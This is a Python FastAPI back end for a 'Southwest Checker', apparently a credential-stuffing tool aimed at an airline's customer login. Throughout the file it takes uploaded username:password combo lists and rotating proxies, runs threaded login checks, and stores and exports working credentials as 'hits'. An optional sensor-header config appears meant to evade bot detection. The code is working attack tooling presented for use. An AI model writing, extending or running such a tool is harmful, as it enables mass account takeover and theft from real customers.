from __future__ import annotations

import json
import time
from pathlib import Path
from typing import Any

from fastapi import FastAPI, File, Form, HTTPException, Query, UploadFile
from fastapi.responses import FileResponse, PlainTextResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

from southwest_checker.proxy import parse_proxy
from southwest_checker.web_adapter import (
    check_account,
    load_capture_config,
    parse_combo,
    parse_proxy_lines,
    set_job_settings,
)

from .combo_store import (
    COMBOS_PATH,
    LARGE_COMBO_THRESHOLD,
    PROXIES_PATH,
    SENSOR_CONFIG_PATH,
    combo_line_count,
    ensure_data_dir,
    has_stored_combos,
    stream_upload_to_file,
    write_text_file,
)
from .db import (
    clear_checked_combos,
    clear_hits,
    delete_hits,
    export_hits_text,
    get_session,
    init_db,
    list_hits,
    save_session,
)
from .worker import worker

STATIC_DIR = Path(__file__).resolve().parent / "static"

app = FastAPI(title="Southwest Checker")
init_db()
ensure_data_dir()


def _apply_checker_settings() -> None:
    session = get_session()
    capture_data = None
    if session.get("auto_sensors") and SENSOR_CONFIG_PATH.exists():
        capture_data = load_capture_config(SENSOR_CONFIG_PATH)
    set_job_settings(
        full_bootstrap=session.get("full_bootstrap", True),
        auto_sensors=session.get("auto_sensors", False),
        capture_data=capture_data,
        request_delay=session.get("request_delay", 0.35),
    )


_apply_checker_settings()


class DeleteHitsRequest(BaseModel):
    ids: list[int]


class SaveSessionRequest(BaseModel):
    combos: str = ""
    proxies: str = ""
    threads: int = 3
    request_delay: float = 0.35
    full_bootstrap: bool = True
    auto_sensors: bool = False


class SmokeTestRequest(BaseModel):
    combo: str = ""
    proxy: str = ""


def _lines_from_text(text: str) -> list[str]:
    return [line.strip() for line in text.splitlines() if line.strip()]


async def _read_upload(file: UploadFile | None) -> str:
    if not file or not file.filename:
        return ""
    raw = await file.read()
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        return raw.decode("latin-1")


def _count_nonempty_lines(text: str) -> int:
    return len(_lines_from_text(text))


@app.get("/")
async def index():
    return FileResponse(STATIC_DIR / "index.html")


@app.get("/api/session")
async def session() -> dict[str, Any]:
    data = get_session()
    data.update(worker.snapshot())
    return data


@app.post("/api/session")
async def save_session_state(body: SaveSessionRequest) -> dict[str, Any]:
    combo_text = body.combos or ""
    line_count = _count_nonempty_lines(combo_text)
    combos_stored = False

    if line_count > LARGE_COMBO_THRESHOLD:
        write_text_file(COMBOS_PATH, combo_text)
        combos_stored = True
        combo_text = ""
    elif line_count > 0:
        write_text_file(COMBOS_PATH, combo_text)

    if body.proxies.strip():
        write_text_file(PROXIES_PATH, body.proxies)

    save_session(
        combo_text,
        body.proxies,
        body.threads,
        combo_count=line_count or combo_line_count(),
        combos_stored=combos_stored or line_count > LARGE_COMBO_THRESHOLD,
        full_bootstrap=body.full_bootstrap,
        auto_sensors=body.auto_sensors,
        has_sensor_config=SENSOR_CONFIG_PATH.exists(),
        request_delay=body.request_delay,
    )
    _apply_checker_settings()
    return {
        "ok": True,
        "combo_count": line_count or combo_line_count(),
        "combos_stored": combos_stored or line_count > LARGE_COMBO_THRESHOLD,
    }


@app.get("/api/status")
async def status(since_log_seq: int = Query(default=0)) -> dict[str, Any]:
    data = worker.snapshot(since_log_seq=since_log_seq)
    session_data = get_session()
    data["checked_count"] = session_data["checked_count"]
    data["combo_count"] = session_data["combo_count"]
    data["combos_stored"] = session_data["combos_stored"]
    return data


@app.post("/api/smoke-test")
async def smoke_test(body: SmokeTestRequest | None = None) -> dict[str, Any]:
    if worker.is_running():
        raise HTTPException(409, "Stop the job before running a smoke test")

    combo_line = (body.combo if body else "") or ""
    proxy_line = (body.proxy if body else "") or ""

    if not combo_line.strip():
        raise HTTPException(400, "Provide username:password for smoke test")

    parsed = parse_combo(combo_line)
    if not parsed:
        raise HTTPException(400, "Combo must be email:password or username:password")

    username, password = parsed
    proxy_value = None
    if proxy_line.strip():
        try:
            proxy_value = parse_proxy(proxy_line.strip())
        except ValueError as exc:
            raise HTTPException(400, str(exc)) from exc

    started = time.time()
    result = check_account(username, password, proxy=proxy_value, timeout=60)
    elapsed_ms = int((time.time() - started) * 1000)

    return {
        "ok": result.status == "HIT",
        "status": result.status,
        "line": result.format_line(),
        "elapsed_ms": elapsed_ms,
        "data": result.to_data(),
    }


@app.post("/api/jobs/start")
async def start_job(
    combos: str = Form(default=""),
    proxies: str = Form(default=""),
    threads: str = Form(default="3"),
    request_delay: str = Form(default="0.35"),
    full_bootstrap: str = Form(default="true"),
    auto_sensors: str = Form(default="false"),
    combo_file: UploadFile | None = File(default=None),
    proxy_file: UploadFile | None = File(default=None),
    sensor_config_file: UploadFile | None = File(default=None),
    use_stored_combos: str = Form(default="false"),
) -> dict[str, Any]:
    if worker.is_running():
        raise HTTPException(409, "A job is already running")

    try:
        thread_count = max(1, min(int(threads or "3"), 20))
    except ValueError:
        thread_count = 3

    try:
        delay_seconds = max(0.0, min(float(request_delay or "0.35"), 5.0))
    except ValueError:
        delay_seconds = 0.35

    bootstrap_enabled = full_bootstrap.lower() in {"1", "true", "yes"}
    auto_sensors_enabled = auto_sensors.lower() in {"1", "true", "yes"}

    if sensor_config_file and sensor_config_file.filename:
        raw = await sensor_config_file.read()
        try:
            payload = json.loads(raw.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError) as exc:
            raise HTTPException(400, "sensor_config must be valid JSON") from exc
        write_text_file(SENSOR_CONFIG_PATH, json.dumps(payload, indent=2))
        auto_sensors_enabled = True
        bootstrap_enabled = False

    capture_data = None
    if auto_sensors_enabled:
        capture_data = load_capture_config(SENSOR_CONFIG_PATH)
        if not capture_data or not capture_data.get("sensor_headers"):
            raise HTTPException(
                400,
                "Auto-sensors mode requires sensor_config.json with sensor_headers",
            )

    set_job_settings(
        full_bootstrap=bootstrap_enabled,
        auto_sensors=auto_sensors_enabled,
        capture_data=capture_data,
        request_delay=delay_seconds,
    )

    combo_lines: list[str] | None = None
    combo_file_path: Path | None = None
    combo_count = 0
    combos_stored = False

    if combo_file and combo_file.filename:
        combo_count = await stream_upload_to_file(combo_file, COMBOS_PATH)
        combo_file_path = COMBOS_PATH
        combos_stored = True
    elif combos.strip():
        line_count = _count_nonempty_lines(combos)
        if line_count > LARGE_COMBO_THRESHOLD:
            combo_count = write_text_file(COMBOS_PATH, combos)
            combo_file_path = COMBOS_PATH
            combos_stored = True
        else:
            combo_lines = _lines_from_text(combos)
            combo_count = len(combo_lines)
            write_text_file(COMBOS_PATH, combos)
    elif use_stored_combos.lower() in {"1", "true", "yes"} or has_stored_combos():
        combo_count = combo_line_count()
        combo_file_path = COMBOS_PATH
        combos_stored = True
    else:
        raise HTTPException(400, "No combos provided")

    if combo_count == 0 and combo_lines is None:
        raise HTTPException(400, "No valid combo lines found")

    proxy_lines = _lines_from_text(proxies)
    proxy_upload = await _read_upload(proxy_file)
    proxy_lines.extend(_lines_from_text(proxy_upload))

    if not proxy_lines and PROXIES_PATH.exists():
        proxy_lines = list(
            _lines_from_text(PROXIES_PATH.read_text(encoding="utf-8", errors="replace"))
        )

    parsed_proxies, invalid_proxies = parse_proxy_lines(proxy_lines)
    proxies_text = "\n".join(proxy_lines) if proxy_lines else proxies
    if proxy_lines:
        try:
            write_text_file(PROXIES_PATH, proxies_text)
        except OSError as exc:
            raise HTTPException(500, f"Cannot write proxy file: {exc}") from exc

    if invalid_proxies and not parsed_proxies:
        raise HTTPException(
            400,
            f"All {len(invalid_proxies)} proxy line(s) are invalid. "
            "Use host:port:user:pass or http://user:pass@host:port",
        )

    save_session(
        "" if combos_stored else combos,
        proxies_text,
        thread_count,
        combo_count=combo_count,
        combos_stored=combos_stored,
        full_bootstrap=bootstrap_enabled,
        auto_sensors=auto_sensors_enabled,
        has_sensor_config=SENSOR_CONFIG_PATH.exists(),
        request_delay=delay_seconds,
    )

    result = worker.start(
        combo_lines=combo_lines,
        combo_file=combo_file_path,
        proxies=[line for line in proxy_lines if line.strip()],
        threads=thread_count,
    )
    if not result.get("ok"):
        error = result.get("error", "unknown")
        if error == "no_combos":
            raise HTTPException(400, "No valid combos found")
        if error == "already_running":
            raise HTTPException(409, "A job is already running")
        raise HTTPException(400, "Failed to start job")

    return {
        "ok": True,
        "status": "preparing",
        "combo_count": combo_count,
        **worker.snapshot(),
    }


@app.post("/api/jobs/stop")
async def stop_job() -> dict[str, bool]:
    worker.stop()
    return {"ok": True}


@app.post("/api/progress/reset")
async def reset_progress() -> dict[str, int]:
    if worker.is_running():
        raise HTTPException(409, "Stop the job before resetting progress")
    cleared = clear_checked_combos()
    return {"cleared": cleared}


@app.get("/api/hits")
async def get_hits() -> list[dict[str, Any]]:
    return list_hits()


@app.get("/api/hits/export")
async def export_hits() -> PlainTextResponse:
    return PlainTextResponse(export_hits_text(), media_type="text/plain")


@app.post("/api/hits/delete")
async def remove_hits(body: DeleteHitsRequest) -> dict[str, int]:
    deleted = delete_hits(body.ids)
    return {"deleted": deleted}


@app.post("/api/hits/clear")
async def remove_all_hits() -> dict[str, int]:
    deleted = clear_hits()
    return {"deleted": deleted}


app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
